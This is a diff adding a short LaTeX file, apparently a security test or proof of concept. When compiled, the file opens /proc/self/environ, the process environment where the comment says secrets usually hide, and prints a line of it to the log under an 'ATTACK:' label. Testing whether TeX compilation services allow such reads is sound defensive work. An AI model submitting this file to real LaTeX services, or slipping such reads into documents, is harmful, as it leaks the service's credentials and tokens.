@@ -1,0 +1,10 @@
+% Reads the environment of the process (where secrets usually hide).
+\documentclass{article}
+\newread\attack
+\begin{document}
+\immediate\openin\attack=/proc/self/environ
+\ifeof\attack\typeout{ATTACK: nothing read}\else
+  \read\attack to\line
+  \typeout{ATTACK: \meaning\line}
+\fi
+\end{document}
